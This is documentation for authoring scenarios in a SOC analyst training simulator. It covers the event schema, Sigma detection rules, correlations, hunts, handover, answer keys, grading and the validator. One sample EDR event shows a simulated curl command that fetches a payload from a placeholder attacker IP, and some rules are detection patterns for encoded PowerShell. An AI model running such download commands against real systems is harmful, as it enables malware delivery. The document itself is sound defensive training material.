# Writing a scenario

A scenario is one shift: the estate, what the previous shift handed over, every event in the lake, the detections that raise alerts, the hunts, and the answer key. It lives in its own folder:

```
app/scenarios/<id>/scenario.js
```

and is listed in `app/scenarios/index.js`:

```js
window.SOC_SCENARIO_CATALOG = [
  { id: "kestrel-ledger", title: "Kestrel Ledger: APAC shift, 2026-11-05" },
  { id: "your-scenario", title: "Your title" }
];
```

The first entry opens by default. `index.html?scenario=<id>` opens another, and the header shows a picker once there are two or more.

`scenario.js` is a plain script so the page also works from `file://`, where browsers block `fetch()` of JSON. It registers itself in the browser and exports itself in node:

```js
(function (root) {
  "use strict";
  var scenario = { schema: 1, id: "your-scenario", /* ... */ };
  if (typeof module === "object" && module.exports) module.exports = scenario;
  else (root.SOC_SCENARIOS = root.SOC_SCENARIOS || {})[scenario.id] = scenario;
})(typeof window !== "undefined" ? window : globalThis);
```

Copy `app/scenarios/kestrel-ledger/scenario.js` as a starting point.

## Schema

| Field | Required | What it is |
| --- | --- | --- |
| `schema` | yes | `1` |
| `id` | yes | Lowercase letters, digits and hyphens. Must equal the folder name. Also names the browser storage key (`soc-shift:<id>`). |
| `title`, `subtitle` | `title` yes | Shown in the desk header. |
| `summary`, `level` | no | One line for a catalog, and a difficulty word. |
| `estate.shift` | yes | `{ name, startUtc, endUtc, date, from, to, local }`. `name` is this shift (APAC), `from` and `to` are the shifts before and after. Times are `HH:MM` UTC on one UTC `date`; the shift must not cross midnight UTC. Optional `team` and `nextTeam` default to `"<name> SOC"` and `"<to> SOC (next shift)"`. |
| `estate.users` | no | `{ "<user>": { name, dept, host, os, region, usualAsn, privileged } }`. Shown when you click a user, and used to link a user's alerts to their host. |
| `estate.hosts` | no | `{ "<host>": { owner, os, role, edr } }`. Shown when you click a host. |
| `owners` | no | Teams an incident can be assigned to. The first is usually this shift's team. |
| `noisyEntities` | no | Entity values too common to link alerts on (your own portal hostnames, shared NAT). |
| `actions` | no | Replaces the built-in response actions for an entity type. Shape below. |
| `anchors` | no | `{ ips: [], packages: [], notes: "" }`. Real public addresses the scenario uses on purpose (the validator allows these), and a sentence shown in the page footer. |
| `enrichExamples` | no | Indicators offered as one-click examples on the Enrich tab. |
| `alertDelayMinutes` | no | `{ "<platform>": minutes }`: how long after its first event a Sigma alert reaches the queue. Shape below. |
| `observables` | no | `{ notIoc, external, internal }`: which values never become IOCs, and the default TLP and PAP for the case exports. Shape below. |
| `variants` | no | `{ ipPools, idPools }`: the values `?seed=N` re-draws. Shape below. Without it the scenario has no variants. |
| `handoverIn` | no | The incoming handover. Shape below. Omit it for a shift that starts clean. |
| `events` | yes | The event lake. Shape below. |
| `rules` | yes | Single-event detections in Sigma YAML. |
| `correlations` | no | Multi-event detections from the built-in types. |
| `hunts` | no | Sigma queries the analyst can run over the whole lake. |
| `answers` | yes | The answer key for every alert. |
| `huntAnswers` | no | What each hunt should find. |
| `tuningChecks` | no | Rule ids whose answer-key tuning proposal the validator must check. |
| `goodShift` | no | `[{ id, sev, text }]`: the incidents a good shift ends with, shown under the answer key. |

### Events

One object per event. Two metadata keys start with an underscore and are hidden from the raw view; every other key is the record as the log source would write it.

```js
{ "_src": "edr", "_t": "2026-11-05T01:05:09Z", "Timestamp": "2026-11-05T01:05:09", "DeviceName": "KL-MBP-0142", "AccountName": "a.rahman",
  "ActionType": "ProcessCreated", "FileName": "curl", "ProcessCommandLine": "curl -Lso ... http://203.0.113.47:1224/pdown", "InitiatingProcessFileName": "node" }
```

- `_t` is UTC ISO time ending in `Z`. Keep the file sorted by `_t`; the validator fails an unsorted timeline.
- Events before `estate.shift.startUtc` are context: they show in timelines and hunts and never raise a Sigma alert.
- `_src` picks the log shape. The desk understands five shapes for one-line summaries and entity extraction:

| `_src` | Shape | Fields the desk reads |
| --- | --- | --- |
| `edr` | Microsoft Defender style device events | `DeviceName`, `AccountName`, `ActionType`, `FileName`, `FolderPath`, `ProcessCommandLine`, `InitiatingProcessFileName`, `TargetFilePath`, `RemoteIP`, `RemotePort`, `RemoteUrl`, `BytesSent`, `PackageName` |
| `sse` | Zscaler style web proxy log | `user`, `url`, `action`, `filename`, `bytes_out`, `dst_ip`, `dst_port` |
| `waf` | Cloudflare style firewall event | `ClientIP`, `ClientRequestHost`, `ClientRequestMethod`, `ClientRequestPath`, `EdgeResponseStatus`, `SecurityAction`, `RequestCount`, `CustomerId` |
| `idp` | Okta System Log | `eventType`, `actor.alternateId`, `client.ipAddress`, `securityContext.asOrg`, `outcome.result`, `target[0].displayName`, `authenticationContext.externalSessionId` |
| `cloud` | AWS CloudTrail | `eventName`, `userIdentity.userName`, `userIdentity.accessKeyId`, `sourceIPAddress`, `requestParameters`, `errorCode` |

Any other `_src` works too: Sigma matches every field, and the summary falls back to the first few `key=value` pairs. Give an event `_summary` to set its one-line summary yourself.

Entities the desk extracts for pivoting: `user`, `host`, `ip`, `domain`, `package` (from `PackageName`), `customer` (`CustomerId`), `session` (`authenticationContext.externalSessionId`), `cloudkey` (`userIdentity.accessKeyId`) and `file` (`filename`).

### Rules

```js
{ id: "R-EDR-003", platform: "EDR", tuningNote: "# review in 30 days", yaml: `
title: PowerShell with an encoded command
status: stable
logsource: { product: edr, category: process_creation }
detection:
  selection:
    FileName: powershell.exe
    ProcessCommandLine|contains: [' -EncodedCommand ', ' -enc ']
  condition: selection
falsepositives:
  - Device management agents run encoded remediation scripts
level: medium
tags: [attack.execution, attack.t1059.001]` }
```

- `yaml` is a Sigma rule. sigma.js supports the Sigma 2.0 detection spec: field maps and lists, wildcards, `contains`, `startswith`, `endswith`, `all`, `re`, `exists`, `cidr`, `gt`/`gte`/`lt`/`lte`, `fieldref`, `windash`, `base64`/`base64offset`, `wide`, and conditions with `and`, `or`, `not`, brackets, `1 of x*`, `all of x*` and `them`. Nested fields use dots (`outcome.result`). Inside a JavaScript template literal, write a single backslash as `\\`.
- Every rule needs a `level` and at least one `attack.tNNNN` tag that exists in the bundled ATT&CK snapshot.
- `platform` is `EDR`, `SSE`, `WAF` or `SIEM` and sets how alerts group: one alert per host (EDR), source IP (WAF), user (SSE) or user (SIEM). Set `groupBy: "<field path>"` to group on something else. Several matching events with the same group key make one alert.
- `tuningNote` is the comment appended to a tuning proposal. `tuningFields` overrides the fields the tuner tries for this rule (defaults: EDR `InitiatingProcessFolderPath`, `InitiatingProcessSigner`; WAF `ClientIP`, `ClientRequestHost`; SSE `user`; SIEM `client.ipAddress`).

### Correlations

Single-event Sigma cannot express "many failures then one success" or "one session from two networks", so these are built-in types with parameters. `select` is a Sigma `detection` block that picks the events the correlation looks at.

**`burst_then_success`**: many failed attempts from many sources in one group, then a success inside the window. The alert keys on the success's subject and pulls in every later event on that subject.

```js
{ id: "C-WAF-001", platform: "WAF", type: "burst_then_success", title: "...", level: "high", attack: ["T1110.004", "T1078"], description: "...",
  falsepositives: ["Shared NAT for a large customer office"],
  select: `
detection:
  selection:
    ClientRequestMethod: POST
    ClientRequestPath|endswith: /auth/login
  condition: selection`,
  groupBy: "ClientASN",                 // the pool the attempts come from
  sourceField: "ClientIP",              // distinct sources counted
  countField: "DistinctUsernames",      // summed over failures (omit to count events)
  success: { field: "EdgeResponseStatus", equals: 200 },
  subjectField: "CustomerId",           // whose account the success landed on
  minSources: 5, minCount: 500, windowMinutes: 15,
  labels: { sources: "source IPs in", count: "distinct usernames tried", followOn: "follow-on requests on the same customer" } }
```

**`same_key_many_values`**: one key (a session id, a token) seen with several values of another field (ASN, country, device). The alert arrives with the first event carrying a new value.

```js
{ id: "C-IDP-001", platform: "SIEM", type: "same_key_many_values", title: "...", level: "high", attack: ["T1550.004", "T1539"], description: "...",
  select: `
detection:
  selection:
    authenticationContext.externalSessionId|exists: true
  condition: selection`,
  keyField: "authenticationContext.externalSessionId", valueField: "securityContext.asOrg", subjectField: "actor.alternateId",
  minValues: 2, includeEarlier: true,   // include events from before the shift when grouping
  labels: { key: "session", events: "SSO events on that session" } }
```

A new type is a function in `CORRELATORS` in `app/js/engine.js` that takes `(correlation, eventsInShift, allEvents, shiftStart)` and returns alerts.

### Hunts

```js
{ id: "H-03", title: "Unsigned binaries run from Downloads", why: "Cracked installers are the usual infostealer delivery.", yaml: `
title: Unsigned executable from a Downloads folder
logsource: { product: edr, category: process_creation }
detection:
  selection:
    FolderPath|contains: ['\\Downloads\\', '/Downloads/']
    Signer: unsigned
  condition: selection
level: medium
tags: [attack.execution, attack.t1204.002]` }
```

A hunt runs over every event up to the shift clock, including events before the shift.

### Handover in

```js
handoverIn: {
  from: "AMER", analyst: "AMER analyst on duty", at: "2026-11-04T23:58:00Z",
  summary: "One line on the previous shift.",
  items: [
    { kind: "case", case: "CASE-1187", title: "...", severity: "medium", status: "open", done: "...", next: "...", owner: "APAC", due: "02:00 UTC",
      pending: "IT-5521 password reset (IT operations)", ticket: "IT-5521",
      pendingAction: { entity: "user:j.okafor", action: "reset", label: "Force password + MFA reset (IT-5521)", platform: "IdP", owner: "IT operations" } },
    { kind: "watch", case: "WATCH", title: "...", severity: "info", status: "watch", done: "...", next: "...", owner: "APAC", due: "04:00 UTC" }
  ],
  watch: ["192.0.2.66: MFA push source in CASE-1187 (AMER)"],
  metrics: { alerts: 11, tp: 1, fp: 7, benign: 3, escalated: 0 }
}
```

Acknowledging the handover turns each `kind: "case"` item into an open incident owned by this shift, adds its `pendingAction` as a pending action, and copies `watch` to the watch list. If an item has a `ticket`, the handover check flags the incident when its next action stops mentioning that ticket. `from` must equal `estate.shift.from`.

### Response actions

Built-in actions exist for `host` (isolate, triage package), `ip` (block on SSE, block on WAF), `domain`, `user` (revoke sessions, disable, password and MFA reset), `cloudkey`, `customer`, `package`, `file` and `session`. To replace the list for a type:

```js
actions: {
  host: [
    { id: "isolate", label: "Isolate host", platform: "EDR", self: true, effect: "Network contained." },
    { id: "reimage", label: "Reimage", platform: "IT", owner: "IT operations", effect: "IT rebuilds the device." }
  ]
}
```

`self: true` means the SOC does it now and it is logged as done. Without it, the action goes to `owner` and stays pending until someone marks it done; pending actions carry into the handover.

### Alert delays

```js
alertDelayMinutes: { EDR: 1, WAF: 1, SSE: 2, SIEM: 5 }
```

A Sigma alert arrives `alertDelayMinutes[platform]` minutes after its first matching event, the way a streaming EDR or WAF feed lands in a minute and a scheduled SIEM search runs every few minutes. A rule can set its own `delayMinutes`, which wins over the platform value. Correlations arrive at the event that completes them, with no extra delay. Without `alertDelayMinutes`, alerts arrive at their first event. The delay is what the shift's MTTD measures, so pick values close to the pipeline the scenario imitates. Keep every alert inside the shift: the validator fails an alert that arrives after `estate.shift.endUtc`.

### Observables

```js
observables: {
  notIoc: ["kestrel.example", "github.com", "140.82.112.4", "Q3_reserve_attestation_draft.xlsx"],
  external: { tlp: "GREEN", pap: "AMBER" },
  internal: { tlp: "AMBER+STRICT", pap: "RED" }
}
```

Each incident lists the observables from its linked alerts and from hunt hits added to it, with an IOC flag, a TLP and a PAP the learner can change. These go out with the TheHive, DFIR-IRIS and STIX exports.

- An observable is attacker-side by default when it is an IP outside private, CGNAT and `estate.corpEgress` ranges, a domain outside `estate.apps`, or an npm package, file name, URL or hash. Attacker-side values start as IOCs with the `external` levels. Users, hosts, sessions, cloud keys and customers start with the `internal` levels and are never IOCs by default.
- `notIoc` lists values that are never IOCs: well-known services the staff use, the company's own domains (a domain also matches its subdomains) and the company's own documents.
- `external` and `internal` default to TLP:GREEN, PAP:AMBER and TLP:AMBER+STRICT, PAP:RED. TLP levels are the TLP 2.0 set (`CLEAR`, `GREEN`, `AMBER`, `AMBER+STRICT`, `RED`), PAP levels are `CLEAR`, `GREEN`, `AMBER`, `RED`.
- `noisyEntities` are left out of observables.
- The DFIR-IRIS export sets a host's asset type from `estate.hosts[host].os`: macOS is a Mac computer, Linux a Linux computer, anything else a Windows computer.

### Seeded variants

```js
variants: {
  ipPools: ["192.0.2.0/24", "198.51.100.0/24", "203.0.113.0/24"],
  idPools: [{ prefixes: ["KL-MBP-", "SG-WIN-"], digits: 4 }, { prefixes: ["cust-"], digits: 5 }]
}
```

`index.html?seed=N` (or **Start a new variant** on the Handover in tab) opens the scenario with these values re-drawn from seed `N`:

- every IPv4 address inside an `ipPools` range moves to another address in the same range (network and broadcast addresses stay)
- every id made of an `idPools` prefix and exactly `digits` digits gets new digits with the same prefix

The whole scenario is rewritten, so events, rules, hunts, the answer key, the incoming handover, `goodShift` and `enrichExamples` all follow. The re-draw is one to one and never lands on a value the scenario already uses. Values outside the pools, such as `anchors.ips` and internal addresses, stay. Seed 0 is the original. A different seed starts a fresh shift in the same storage key.

Put only invented values in the pools: the validator requires `ipPools` to sit inside private or documentation ranges and fails a pool that holds an `anchors.ips` address. Check a few seeds with `--seed` (below).

## Answer keys and grading

Every alert the detections raise needs an answer, and every answer must match an alert that is raised. Alert ids are `<rule or correlation id>|<group key>`:

```js
answers: {
  "R-EDR-001|KL-MBP-0142": { verdict: "tp", sev: "critical", incident: "INC-A", why: "What a good analyst checked and concluded." },
  "R-WAF-001|10.20.0.15": { verdict: "fp", sev: "info", why: "Approved scanner inside its change window." }
}
```

- `verdict` is `tp`, `benign` (benign true positive), `fp` or `escalate`. `sev` is `info`, `low`, `medium`, `high` or `critical`.
- `incident` names the incident the alert belongs to. A `tp` or `escalate` at medium or above needs one. Incident ids in the key are labels for the reader; learners create their own ids.
- `why` is shown in the answer key after the learner reveals it. Write it as the reason a good analyst would leave for the next shift.

Scoring counts alerts where the learner's verdict matches the key. `tp` and `escalate` count as the same call, because both mean "real, act on it" and the difference is who owns it. `fp` and `benign` are scored as different calls: one means the rule was wrong, the other means it was right about something allowed.

```js
huntAnswers: {
  "H-01": { expectHits: 4, unalerted: true, note: "What the hunt finds and why it matters." }
}
```

`expectHits` is the number of events the hunt returns over the whole lake; `unalerted: true` asserts no alert covered any of them. Both are checked by the validator. The learner sees `note` and whether they ran the hunt.

`tuningChecks: ["R-WAF-001"]` asks the validator to apply the answer key's verdicts, build the tuning proposal for each listed rule, and confirm it removes every `fp` and `benign` alert of that rule without losing a `tp` or `escalate`.

## Validate

```sh
node tools/validate-scenario.mjs app/scenarios/<id>
node tools/validate-scenario.mjs app/scenarios/<id> --seed 7 --seed 12345   # also check seeded variants
VERBOSE=1 node tools/validate-scenario.mjs app/scenarios/<id>   # print every passing check too
```

The validator checks:

- shape: `schema`, `id` matches the folder, the shift fields, a non-empty event list, the catalog lists the scenario
- the timeline: every `_t` is UTC ISO ending in `Z`, the file is sorted, at least one event falls inside the shift
- every rule, correlation `select` and hunt compiles with sigma.js; ids are unique; correlation types exist
- every ATT&CK technique id in rule tags, hunt tags and correlation `attack` exists in the bundled ATT&CK snapshot (`app/vendor/attack.json`, v19.2)
- detections run, every answer-key alert is raised and every raised alert has an answer, with a valid verdict, severity and reason
- every alert arrives before the shift ends
- `alertDelayMinutes` names platforms the rules use with 0 to 120 minutes, `observables` uses known TLP and PAP levels, `variants` pools are valid ranges inside private or documentation space with no anchor in them
- with `--seed N`: the re-draw is one to one, stays in its pools, leaves no original pooled value behind, keeps the anchors, and the variant passes every detection, answer-key, hunt, tuning, grading and handover check above
- hunt `expectHits` and `unalerted`, and every `tuningChecks` rule
- a shift that follows the answer key scores full marks and passes the handover check
- no real-looking personal data: email addresses must use reserved example domains (`.example`, `example.com`), IPv4 addresses must be private, CGNAT, documentation ranges or listed in `anchors.ips`, AWS key ids must contain `EXAMPLE`, and there are no Luhn-valid card-like numbers or phone numbers
- no em or en dashes

`npm test` runs the validator on every folder under `app/scenarios/`, and on Kestrel Ledger with seeds 7, 12345 and 31337.

## Writing tips

- Start from the answer key: decide the three to five stories, the noise, and what a good handover says. Then write the events that tell them.
- Give every true positive at least one benign or false-positive neighbour from the same rule, so tuning has something to do.
- Put one thing in the lake that no rule catches and a hunt finds.
- Leave one item that a single shift cannot close (another team owns it), so the handover matters.
- Use documentation ranges and `.example` domains for anything invented. Use a real public indicator only when a live lookup returning a true answer teaches something, list it in `anchors`, and say in `anchors.notes` which activity around it is invented.
